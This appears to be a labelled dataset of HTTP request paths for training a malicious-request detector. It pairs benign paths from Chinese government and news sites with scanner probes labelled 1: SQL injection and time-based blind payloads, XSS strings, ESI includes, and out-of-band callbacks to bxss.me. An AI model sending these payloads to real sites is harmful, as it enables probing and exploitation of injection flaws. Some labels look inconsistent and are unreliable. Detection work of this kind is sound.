request	label
/******/system/2017/11/19/javascript:void(0);	1
/*****/gywm/img/2.gif	0
/**********/system/2021/03/27/013357919.shtml	0
/****/czgk/bmjs/zzqjcyxt/lwsrmjcy/202108/t20210818_2978495.html	0
/******/_content/download.jsp?urltype=news.downloadattachurl%') or 8564=8564 and '%'='&owner=1707212448&wbfileid=51419	1
/****/system/2013/05/24/011093852.shtml	0
"/****/gfxwj/5619/5635/\""javascript:void(0)\"""	1
/****/zgsdt/2013zgsdt/201412/t20141218_41013.html	0
/****/czgk/bmyjs/zzqjcyxt/hyxrmjcy/201903/t20190305_1298216.html	0
/**********/system/2020/03/23/013122664.shtml	0
/***********/zaojianpinglun/?_=1640035433336	0
/***/interface/comul_total.json.jsp?callback=jquery19105471681841739233_1640053190529	0
/****/rsgzxx/rsrm%' and 2*3*8=6*8 and 'gstt'!='gstt%/1.htm	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u675e\u8fb0\u65b0\u8363\u5efa\u6750\u7ecf\u9500\u90e8	0
"/**/cometchat/plugins/handwrite/index.php?id="""">alert(777)"	1
/****/system/2017/10/18/012444244.shtml	0
/*****/system/2012/07/04/010816619_01.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u964d\u8d39	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u6676\u5e73\u7cae\u6cb9\u526f\u98df\u5e97	0
/******/visitcount/visit.jsp?i_columnid=1&i_webid[0]==convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1501886299')))and 3 in &i_webid[1]=3&type=1	1
/zwxx_11337/****/zcjd/202111/t20211112_3126387_zzb.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u4f0d\u52a0\u670d\u9970\u5e97	0
/admincp.php?infloat=yes&handlekey=123);alert(/***/);//	1
/****/web/search?channelid=234439&orderby=relevance%' and 4277=0375 and '%'='&perpage=24&searchword=1	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u798f\u5efa	0
/****/zfxxgk/fdzdgknr/ghxx/zxgh/202001/t20200106_1915138.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6da6\u4e30\u65f6\u4ee3\u5546\u8d38\u6709\u9650\u516c\u53f8	0
/*******/xxgknb/2013/list.html	1
/**********/system/2021/06/25/013408296.shtml	0
/****/system/2021/11/26/javascript:window.close();	1
/**********/system/2020/03/31/013129053.shtml	0
/****/20210727/n.src	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(762)"">?_=1630311583379"	1
/******/zsn/js/jquery-1.4a2.min.js	0
/******/hfhnxz	0
/zwxx_11337/****/202006/t20200624_2145396.html/index_1.html	0
/***/system/more/18101000000000000/0000/18101000000000000_00000001.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u6377\u521b\u5bb6\u7535\u7ef4\u4fee\u90e8	0
/zwxx_11337/****/201912/t20191203_1870346.html	0
/**********/system/2021/06/10/013399876.shtml	0
/***/0/01/26/02/1260274_518475.jpg	0
/?bxss.me/*/xss.html?	1
/*******/zwgk/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqgdzt/	0
"/****/category/silutouzi?page=1'""""()&%<acx><script >z9xk(9243)</script>"	1
/****/jcgc/	0
/zwxx_11337/****/zcjd/201610/t20161028_313142.html	0
/zwxx_11337/****/202111/t20211115_3128117_zzb.html	0
/******/admin/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777)	1
/****/admin/index.php?o=panel&a=receiver.edit&id=alert(777)	1
"/****/czgk/bmjs/zzqfyxt/znxrmfy/\""javascript:void(0)\"""	1
/**********/system/2020/12/02/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u6587\u6db5\u5efa\u7b51\u5668\u6750\u79df\u8d41\u90e8	0
/*********/zc4/2020-01-16/168147.html	0
"/****/bysw/202109/t20210918_186720.html?leader=' 'a'.concat(70-3).concat(22*4).concat(118).concat(73).concat(100).concat(73) (require'socket'
socket.gethostbyname('hitno' 'vpjzwewg45cc2.bxss.me.')[3].to_s) '"	1
/***/0/02/11/97/2119789_800294.jpg	0
/**********/system/2021/08/21/013437975.shtml	0
/*****/20170704/3334.html	0
/***/0/01/26/02/1260273_439401.jpg	0
/**/ohac/' and 'x'='y	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtdmewbclwv0c0nyaubz79go=&openid=ovl7jjmemzuiv4h6ndwgy03jscy8&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhbz6cuhzikrt2pw7uoznapt/oo8dbj5 fzedtzplsmcars6 ebftju9vjidtkk2r/cyuoszga6vf87j0f8st3ibw=	0
/****/dqgz/201904/t20190410_207684.html	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u5eb7\u81ea\u4f1f\u4e94\u91d1\u65e5\u6742\u5546\u5e97	0
/zwxx_11337/****/201808/w020180802296687054182.jpg	0
/**/system/2021/04/26/012155885.shtml	0
/*****/judgeactivity	0
/***/interface/comul_total.json.jsp?callback=jquery111105003055908748169_1639991183479	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5ba3\u548c\u9547\u5b87\u822a\u5546\u5e97	0
/***/0/02/07/45/2074536_541004.jpg	0
/****/xxczh1/ywdt' and 2*3*8=6*8 and '8eli'='8eli.htm	1
/******/1/pc.js	0
/*****/gy42/ljcpgyview.asp?id=29082783&l2=\ufffd\u4eba&l=\ufffd\ufffd\ufffd\ufffd	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5409\u745e\u5546\u884c	0
/*********/file/china/guoao/2019-12-09/ce9fa6580a54c76025064be37225db32.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5510\u95e8\u98de\u6b4c\u8db3\u6d74\u4e2d\u5fc3	0
/zwxx_11337/****/202103/t20210317_2629510_zzb.html	0
/****/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg	1
/****/ssgs/zggj/	1
/****/web/search?page=236&channelid=222832&searchword=\u54b8\u8f89&keyword=\u54b8\u8f89&perpage=20&outlinepage=10	0
/*****/system/2010/04/23/010104831_04.shtml	1
/****/zzxxgk/tjj' and 2*3*8=6*8 and 'h1l5'='h1l5/zfxxgkml_2127/hygq_2064/list.html	1
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=bxss.me&total=1&tpl=16&websiteid=110105008056111	1
/****/zt/2019wznb/zzqbm/202001/p020200116630774424905.pdf	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5077\u9003\u7a0e	0
/*****/system/2019/11/11/javascript:window.close();	1
/****/b-e829776.html	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqyjglt/zzqajj/	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5e38\u4fe1\u5c0f\u9648\u7535\u710a\u4fee\u7406\u90e8	0
/*******/qiye/b-e2501950.html	0
/************/template/jcse/110105008056111/16/http://bxss.me/t/fit.txt?.jpg/plugin/voice/hzrecorder.js	1
/****/xxgkml/qtfdxx/zcjd/qwjd/202009/t20200923_172543.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u80a4\u5982\u8bd7\u79d1\u6280\u6709\u9650\u516c\u53f8	0
/***/0/01/83/38/1833807_948553.png	0
/******/error?errmsg=ababab--><script>alert(1337)</script>	1
/******/system/2020/11/23/013288919.shtml	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u542f\u65b0\u52b3\u52a1\u6709\u9650\u516c\u53f8	0
/****/zdlygk/gytdsdfwzs'||'/zws/zcwj.htm	1
/****/zt/hjbhdc/202111/t20211124_3147310.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8d3e\u5858\u4e61\u674e\u6d77\u6d0b\u517b\u6b96\u573a	0
"/************/template/jcse/110105008056111/16'""""()&%<acx><script >nn9n(9559)</script>/images/plugin/criteria/css.css"	1
/***/interface/daily_clickcount.json.jsp?callback=jquery1111000915458402572078_1640052979191	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9a6c\u8363\u706b\u9505\u5e97	0
/**********/system/more/221000000000000/0010/221000000000000_00001087.shtml	0
/*****/search.asp?field=my_baizi&classid=&keyword=\u00d0\u00a1\u00cb\u00c9\u00d3\u00a2\u00ca\u00f7	0
"/************/interfaces/dimension.do?begin=&end=&eq=&oq=&p=1&pg='""""()&%<acx><script >xgno(9367)</script>&pos=&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111"	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5e73\u4ef7\u7efc\u5408\u95e8\u5e02\u90e8	0
/****/czgk/bmjs/sydw1/zzqwxdglwyhbgs/201808/t20180816_977561.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u559c\u5b50\u725b\u8089\u9762\u9986	0
/***/2021/4/2/art_31_228692.html	0
/*****/b-e2065839.html	0
//***********/zxft/	1
/****/byszf/sz/bxss.me/t/xss.html?	1
/****/zt/2020wznb/	1
/****/0814/651723.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u7396\u5473\u9e2d\u8116	0
/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg'||'_2061/list.html	1
/****/zt/hjbhdc/index_1.html	0
/*****/gy42/cpgyss.asp?key=\ufffd\u03fb\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/***/0/02/05/65/2056562_998713.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u6f6e\u7f8e\u6c47\u53d1\u578b\u5b9a\u5236\u5e97	0
/**********/system/2021/10/07/javascript:void(0);	1
/****/xxgkzn/list.html?new=/xfs.bxss.me	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u9c7c\u4f60\u76f8\u7ea6\u7eb8\u5305\u9c7c\u9910\u5385\u897f\u666f\u82b1\u56ed\u5e97	0
/**********/system/2020/04/23/013147172.shtml	0
"/**/ui/widgets/hanweb/iconfont/css"""" and 2*3*8=6*8 and """"dvzx""""=""""dvzx/iconfont.css"	1
/****/20201015/e108453972.html	0
/zwxx_11337/****/201810/t20181009_1104314.html	0
/**********/system/2021/12/05/013490119.shtml	0
/****/bmkx/gjj/201902	0
/***/0/02/11/79/2117911_999567.jpg	0
"/***/col14/index.html/""><script>alert(609)</script>"	1
/**********/system/2021/03/27/013357914.shtml	0
"/****/web/search?channelid=234439&orderby=relevance&perpage=24&searchword=1""""><script>alert`01862`</script>"	1
"/****/czgk/bmjs/qtdw/zzqnfb/\""javascript:void(0)\"""	1
"/****/zfcwhy/202107/t20210723_'""""()&%<acx><script >pbjz(9862)</script>.html"	1
"/"""".gethostbyname(lc(""""hitqa"""".""""qyattfwj49f10.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(102).chr(87).chr(102).chr(70).""""/****/swsj/"	1
/****/api/apibankagreementcontroller/validatephone?phonecode=2398&lxsj=18102514231	0
/**/system/count/0006003/000000000000/window.location.href	1
/****/bmkx/ygjt/201912/w020191218336645649976.jpg	0
/****/bmkx/sjcy/201805/t20180509_103258.html	0
/****/20200916/e106852015.html	0
/****/system/2021/02/03/013331315.shtml	0
/**********/system/2017/10/15/012440319.shtml	0
/****/js/chunk-444fb464.f622f196.js	0
/****/system/2021/05/06/013380294.shtml	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(1206)"">?_=1630311796458"	1
/*/public/viewclick/?addclick=1&classid=-1; waitfor delay '0:0:9.138' -- &id=10226	1
"/****/jspmyadmin/tabledata.jsp?server=localhost&db=mysql&table=""""/>alert(777);"	1
/****/ssgs/zgdy/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/*****/images/16.gif	0
/__media__/**/netsoltrademark.php?d=cutt.ly/zzgi8bb	0
/***/interface/daily_clickcount.json.jsp?callback=jquery17102509041082583032_1640053192825	0
/**********/system/2016/01/10/011909009.shtml	0
/zwxx_11337/****/202004/t20200414_2021033.html	0
/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=34&i_articleid=200398	0
"/******/web/messagebook/script/messagebook.js/<img src=""javascript:alert(5743)"">"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u5a55\u6668\u7279\u4ea7\u5546\u5e97	0
/***/0/00/79/82/798205_133748.jpg	0
/******/jslib/urite/urite.min'||'.js	1
/****/zgsdt/2021_qydt/202106/w020210623626701210592.jpg	0
/****/ and 1>1	1
"/****/gfxwj/201911/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/****/wdsjs/hfswsj/201911/t20191118_144438_wap.html	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u4f1f\u6052\u5546\u8d38\u6709\u9650\u516c\u53f8	0
/****/tzgg/201905/t20190529_1527749_zzb.html	0
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(3369)</script>?_=1630311833017"	1
/****/web/search?channelid=299868%') or 3768=3768	1
/***/0/02/12/33/2123346_997255.jpg	0
/**********/system/2016/10/09/012153981.shtml	0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/gcjsbzgl/gcjybz.htm	1
"/***/getsubject?data={""subject_id"":511,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":376598,""sign"":""""}"	0
/***/0/00/03/06/30613_247028.jpg	0
/***/2021/10/http://bxss.me/t/xss.html?	1
/******/system/2021/04/21/013372466.shtml	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u7f51\u7ea6\u8f66	0
"/************/search.do?category=0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z&cateid=1&p=1&pg=1&q=请输入关键词&tpl=16&websiteid=110105008056111"	1
/******/resource' and 2*3*8=6*8 and 'tjsn'='tjsn/js/gotopage.js	1
/**/mediacenter/news/202012/t20201201_264190.html	0
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/******/fdzdgknr/qtfdxx/	1
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1920&h=1080&treeid=1022&refer=ahr0cdovl3d3dy5uegpzy3guy29tlmnul2luzm8vmtexnc8xmjc0lmh0bq==&pagename=l2xpc3quannw&newsid=-1	0
/**********/system/2021/12/19/013496789.shtml	0
/****/xqdt/byq/201803/w020180307647020094998.jpg	0
/****/bmkx/sgsj/202001/t20200129_146914.html	0
/******/hfjtsj/202108/t20210830_186150.html	0
/****/0329/824224.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u300a\u5e7f\u4e1c\u7701\u5e73\u5b89\u5efa\u8bbe\u6761\u4f8b\u300b	0
/****/tzgg/2015/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6708\u5e9c\u4e00\u53f7\u6c49\u9910	0
/zwxx_11337/****/202112/t20211213_3217975.html	0
"/****/category/difangdongtai?page=1'""""()&%<acx><script >x5io(9816)</script>"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u585e\u4e0a\u552f\u771f\u719f\u98df\u5e97	0
/**/news/xwygx/202108/t20210827_315213.html	0
/**********/system/2021/07/27/013425991.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u7ecf\u6d4e\u5f00\u53d1\u533a\u96c4\u4e30\u4e94\u91d1\u7535\u6599\u7ecf\u9500\u90e8	0
/****/zt/hjbhdc/201704/t20170418_319823.html	0
/****/\ufffd\ufffd\ufffd\ufffd\u02a1	0
/*****/system/2011/03/16/010310615.shtml	0
//***********/public.css	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u8881\u8bb0\u4e32\u4e32\u9999\u706b\u9505\u4e0a\u4e1c\u6d77\u5e97	0
/****/zt/msss/msxw/201902/t20190212_1277359.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u8096\u6960\u5546\u884c	0
/****/ztjj2022lz/lhsd/javascript:void(0);	1
/****/zt/msss/msxw/201902/t20190219_1283504.html	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u987a\u7965\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)>	1
/****/index.php?title=acunetixtest174137&action=submit	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u6d3e\u8fbe\u852c\u83dc\u914d\u9001\u4e2d\u5fc3	0
/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg%' and 2*3*8=6*8 and 'jeda'!='jeda%_2061/list.html	1
/***/interface/comul_total.json.jsp?callback=jquery17106137371016544515_1639973235929	0
/****/yfyfwpt/gjsccjzx/ywly/gccb/gcjsgc/yqlj/ddjs/ghgz/wzdt/	0
/****/xqdt/byq/201707/w020170724579650076451.jpg	0
"/******/jslib/ckplayer/ckplayer.js?_=1630312259432&appscan=>""><script>alert(6210)</script>"	1
"/***/col32/index"""" and 2*3*8=6*8 and """"qdyl""""=""""qdyl.html"	1
/****/system/2016/11/11/012183078.shtml	0
"/******/web/jpage/theme/simple/css/jpage"""" and 2*3*8=6*8 and """"ym2j""""=""""ym2j.css"	1
/****/web/search?channelid=299868&perpage=1000 and 1>1	1
/****/yqzt/fykp/	1
/*******/zwgk/czgk/bmyjs/zzqjcyxt/jyxrmjcy/	0
"/****/czgk/bmjs/zzqjcyxt/ldxrmjcy/\""javascript:void(0)\"""	1
"/***/openemr/?site="""">alert(777);"	1
/*****/system/2010/10/31/010224372.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5ba3\u548c\u9547\u4f0a\u54c8\u5440\u6e05\u771f\u996d\u9986	0
/*****/md5.asa	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u706b\u738b\u53a8\u536b\u7ecf\u9500\u5e97	0
/***/0/01/79/86/1798619_791735.jpg	0
/*****/index/lists/cate_id/161.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u536b\u4e2d\u67b8\u675e\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/****/qyjbxx/	0
/*****/bxhs/	0
"/**/ui/lib/easyui/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/jquery.linkbutton.js"	1
/*******/qiye/b-e946956.html	0
/*****/gy42/ljcpgyview.asp?id=29000149&l2=\ufffd\u0276\ufffd&l=\ufffd\u0134\ufffd	0
/**/system/2020/11/05/012086061.shtml	0
"/***/nbhd/opengovmsgbox.do?appid=4<esi:include src=""""http://bxss.me/rpb.png""""/>&method=listgovmsgboxs&pagesize=5&siteid=115"	1
/**/thumb.php?src=<body onload=alert(777)>.jpg	1
/****/zzxxgk/tjj/zfxxgkml_2127/zcjd_2053/202106/w020210623594394188687.png	0
/zwxx_11337/****/202007/t20200708_2157253.html	0
/***/0/01/22/70/1227069_820437.jpg	0
/***********/jinrongqihuo' and 2*3*8=6*8 and 'wznh'='wznh/guzhiqihuo/	1
/****/bmkx/swjw/201905/w020190501401932988759.jpg	0
/******/0/http://bxss.me/t/fit.txt.js	1
/****/finderview/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280	1
/****/qzfwj/202111/w020211129603408372593.png	0
/****/hhsswzwxw/javascript:void(0);	1
/*****/system/2021/11/04/javascript:window.print()	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtm9ymtn0klaehxxlu5tyggo=&openid=ovl7jjkufmjuimoy9ipnocq1qow8&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhb53omb1vfpomqw/xch6ohd/oo8dbj5 fzedtzplsmcarob7c/bvlxukq55/htbnt/a6nlqwsre4wpe7impkfzo4=	0
/***/js/ord/prepare_shipping_order.js	0
/****/zt/yqfkzccs/yqfkdt/index_43.html	0
/if(now()=sysdate(),sleep(3),0)/******/lzyj/	1
/***********/jinrongqihuo/guzhiqihuo/if(now()=sysdate(),sleep(3),0)_2.html	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u7d2b\u8f69\u978b\u5e97	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u94f6\u5546\u652f\u4ed8\u6280\u672f\u6709\u9650\u516c\u53f8\u5434\u5fe0\u5206\u516c\u53f8	0
/****/zfxxgk/fdzdgknr/qtfdxx/zfwj/201808/w020180806313461932282.doc	0
/****/1076/2970.htm	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9686\u6e56\u8299\u84c9\u5316\u5986\u54c1\u5e97	0
/**/ui/widgets/http://bxss.me/t/fit.txt/ie6fixed/ie6fixed.js	1
/****/api/apibankagreementcontroller/savebankdetectinfocontroller	0
"/****/ypj/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202112/w020211220625775423786.jpg	0
/****/fzjx/	0
/***/003/001/694/00300169434_4892101e.jpg	0
/****/bxss.me/1088/1105/list.html	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6d2a\u971e\u5546\u884c	0
/*****/system/2021/11/14/javascript:void(0);	1
/******/bg-sqddf.png	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u6c38\u5eb7\u9547\u7f57\u79c9\u594e\u7ecf\u7eaa\u4eba\u670d\u52a1\u90e8	0
/zwxx_11337/****/201811/t20181101_1145885.html	0
/****/rsgzxx/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/1.htm	1
/zwxx_11337/****/zcjd/202106/t20210618_2892176_zzb.html	0
/zwxx_11337/****/202108/t20210817_2976539.html	0
/**/images/down.png	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u7ff0\u7687\u64e6\u978b\u5e97	0
/zwxx_11337/***/201710/t20171017_523947.html	0
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/***/main.css	1
/****/xxgkml/qtfdxx/dcjc/202108/t20210806_185448_wap.html	0
/zwxx_11337/****/202006/t20200605_2129519.html	0
/****/201909/t20190926_1757718.html	0
"/****/abantecart/index.php?rt=""><script>alert(777);</script>&s=your_admin""><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e""><script>alert(777);</script>"	1
/***/admin/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user	1
/*****/gy48/cpgyss.asp?key=\u793c\u54c1\u7bb1\u5305\ufffd?&l=\ufffd\ufffd\ufffd\u0279\ufffd	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u77f3\u6c9f\u9a7f\u5174\u9686\u996d\u9986	0
/****/bmkx/sgsj/202006/w020200612696892355108.jpg	0
/*****/nbgx/index.php	1
/***/xbt/images/02.jpg	0
/****/web/search?channelid=299868' or 8510=2183 and '1'='1&perpage=1000	1
/*****/web/sa3/addholiday.do	1
/******/system/2017/06/12/javascript:window.print()	1
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6cb3\u5357	0
/*****/gy42/cpgyss.asp?key=\u6d4b\u901f\u7535\u673azys&showpage=1&l=\ufffd\u3f6d	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u06f4\ufffd\ufffd\ufffd\ufffd\ucce7&showpage=1&l=\ufffd\ufffd\ufffd	0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/202010/t20201030_173528.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u91d1\u94f6\u6ee9\u9547\u71d5\u5b50\u9ebb\u8fa3\u70eb\u997a\u5b50\u9986	0
/******/bootstrap_zwfw.css	0
/zwxx_11337/****/202105/t20210520_2848290.html	0
/****/jtdt/2021_jtyw/202108/t20210819_314634.html' and 'x'='x	1
/***********/jinrongqihuo/0'xor(if(now()=sysdate(),sleep(28),0))xor'z/	1
"/*/210719/index/'""""()&%<acx><script >he7f(9634)</script>.css"	1
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u5c11\u5175\u5546\u5e97	0
/**/zfxxgkjs/index.html?channelid=295157&searchword=	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u7ea2\u5bfa\u5821\u533a\u5efa\u5175\u51c9\u76ae\u52a0\u5de5\u90e8	0
/****/gccb/ and 1>1	1
/*******/qiye/20211122/e142058120.html	0
/****/xqdt/jyx/201610/t20161025_47900.html	0
/**/mediacenter/specials/index_8.html	0
/****/system/2021/12/12/javascript:window.close();	1
/**/sustainability/csr/qywh/ywzzq/wzdt/xwzx/zgsdt/2021_qydt/202111/ddjs/qtgz/gygj/gjgk/zzjg/gjcp/clhlbj/images/css.css	0
/****/zt/tpgj_1542/202007/t20200703_2153560.html	1
/**/news/xwygx/202108/t20210813_314350.html	0
/zwxx_11337/****/202001/t20200108_1917409.html	0
"/******/czsc/fonts/index.jsp/""""><script>alert`99227`</script>"	1
/**********/system/2021/08/14/013434790.shtml	0
"/***/2021/8/23/art_32<esi:include src=""""http://bxss.me/rpb.png""""/>_237912.html"	1
/**********/system/2020/07/05/013199073.shtml	0
/***/interface/daily_clickcount.json.jsp?callback=jquery191046725553295688527_1639973149367	0
"/****/zjdt/kjybzde/gzdt/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z.htm"	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5ba3\u548c\u9547\u946b\u6e90\u5546\u884c	0
/*****/h1626063478.html	0
"/****/web/search?page=2*/-->'""""></iframe></script></style></title></textarea><script >alert(55292)</script>&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10"	1
/**********/system/2015/12/23/011895596.shtml	0
/******/n42746'||'/index_244329_100.html	1
/**/frontcontroller?domainname=<script>alert(77729</script>&operation=160	1
/**********/jyxw/	0
/****/yzw/spbd/	0
"/****/gccb/qcgc//*/-->'""""></iframe></script></style></title></textarea><script >alert(67446)</script>"	1
"/***/getsubject?data={""subject_id"":357,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":4611,""sign"":""""}"	0
"/******/szjj/""><script>alert(4)</script>"	1
/**********/system/2020/06/25/013192979.shtml	0
/***/mood/default/images/enorth/news_xq_ws_005.gif	0
/**********/system/2021/11/11/javascript:void(0);	1
/****/web/search?page=3&channelid=222832&searchword=\u962e\u6559\u80b2&keyword=\u962e\u6559\u80b2&perpage=20&outlinepage=10	0
/***/003/004/218/00300421863_c3db8d71.jpg	0
/*****/system/2019/04/15/javascript:void(0);	1
